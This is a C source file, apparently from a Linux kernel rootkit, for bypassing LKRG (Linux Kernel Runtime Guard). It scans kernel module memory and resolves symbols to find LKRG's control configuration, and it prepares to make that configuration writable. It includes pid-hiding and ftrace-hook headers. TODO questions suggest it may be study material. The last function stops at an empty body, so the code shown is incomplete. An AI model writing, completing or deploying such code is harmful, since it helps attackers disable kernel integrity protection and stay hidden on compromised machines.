#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include <linux/perf_event.h>
#include "../include/lkrg_bypass.h"

// TODO 001: Why do we define these atomic values?
static atomic_t hooks_active = ATOMIC_INIT(0);
static atomic_t umh_bypass_active = ATOMIC_INIT(0);
// TODO 002: Why do we have this notifier_block?
static struct notifier_block module_notifier;

// TODO 003: Why do we setup this delay?
#define LKRG_SETUP_DELAY_MS 1000

// 
static char lkrg_log_buf[512];
static DEFINE_SPINLOCK(lkrg_log_lock);

struct lkrg_ctrl_conf {
#if defined(CONFIG_X86)
    unsigned int p_smep_validate;
    unsigned int p_smap_validate;
#endif
    unsigned int p_pcfi_validate;
    unsigned int p_pint_validate;
    unsigned int p_kint_validate;
    unsigned int p_log_level;
    unsigned int p_block_modules;
    unsigned int p_msr_validate;
    unsigned int p_heartbeat;
    unsigned int p_interval;
    unsigned int p_umh_validate;
#if defined(CONFIG_X86)
    unsigned int p_smep_enforce;
    unsigned int p_smap_enforce;
#endif
    unsigned int p_pcfi_enforce;
    unsigned int p_pint_enforce;
    unsigned int p_kint_enforce;
    unsigned int p_trigger;
    unsigned int p_hide_lkrg;
    unsigned int p_umh_enforce;
    unsigned int p_profile_validate;
    unsigned int p_profile_enforce;
};

struct lkrg_ro_view {
#if !defined(CONFIG_ARM) && defined(CONFIG_X86)
    unsigned long marker_np1 __attribute__((aligned(PAGE_SIZE)));
#endif
  struct {
      struct lkrg_ctrl_conf ctrl;
  } p_lkrg_global_ctrl __attribute__((aligned(PAGE_SIZE)));
};

static struct lkrg_ctrl_conf saved_lkrg_ctrl;
static struct lkrg_ctrl_conf *lkrg_ctrl;
static bool lkrg_ctrl_saved;
static int (*set_memory_rw_fn)(unsigned long addr, int numpages);
static int (*set_memory_ro_fn)(unsigned long addr, int numpages);
static void lkrg_setup_workfn(struct work_struct *work);
static DECLARE_DELAYED_WORK(lkrg_setup_work, lkrg_setup_workfn);

static notrace bool ctrl_ok(struct lkrg_ctrl_conf *ctrl) {
    if (ctrl == NULL) return false;

    if (ctrl->p_pcfi_validate > 9 || ctrl->p_pint_validate > 9 ||
        ctrl->p_kint_validate > 9 || ctrl->p_umh_validate > 9 ||
        ctrl->p_pcfi_enforce > 9 || ctrl->p_pint_enforce> 9 ||
        ctrl->p_kint_enforce > 9 || ctrl->p_umh_enforce > 9 ||
        ctrl->p_profile_validate > 9 || ctrl->p_profile_enforce > 9 ||
        ctrl->p_log_level > 9)
        return false;

    return true;
}

static notrace struct lkrg_ctrl_conf *lkrg_scan_module_memory(void) {
    unsigned long addr;
    struct lkrg_ctrl_conf buf;
    struct lkrg_ctrl_conf *found = NULL;
    int candidates = 0;

    for (addr = MODULE_VADDR; addr + sizeof(buf) <= MODULES_END; addr += PAGE_SIZE) {
        if (copy_from_kernel_nofault(&buf, (void *)addr, sizeof(buf)) != 0)
          continue;

        if (!ctrl_ok(&buf))
            continue;

        if (buf.p_hide_lkrg != 1)
            continue;

        if (!buf.p_umh_validate && !buf.p_pint_validate && !buf.p_pcfi_validate)
            continue;

        if (buf.p_interval < 5 || buf.p_interval > 1800)
            continue;

        if (buf.p_log_level > 4)
            continue;

        candidates++;
        found = (struct lkrg_ctrl_conf *)addr;

        if (candidates > 1)
            return NULL;
    }

    return found;
}

static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void) {
    void *ro;
    struct lkrg_ctrl_conf *ctrl;

    if (lkrg_ctrl) return lkrg_ctrl;

    ro = resolve_sym("p_ro");
    if (ro) {
        ctrl = &((struct lkrg_ro_view *) ro)->p_lkrg_global_ctrl.ctrl;
        if (ctrl_ok(ctrl))
          return ctrl;

        ctrl = (struct lkrg_ctrl_conf *)ro;
        if (ctrl_ok(ctrl))
            return ctrl;
    }

    return lkrg_scan_module_memory();
}

static notrace bool lkrg_ctrl_make_rw(void *addr) {}
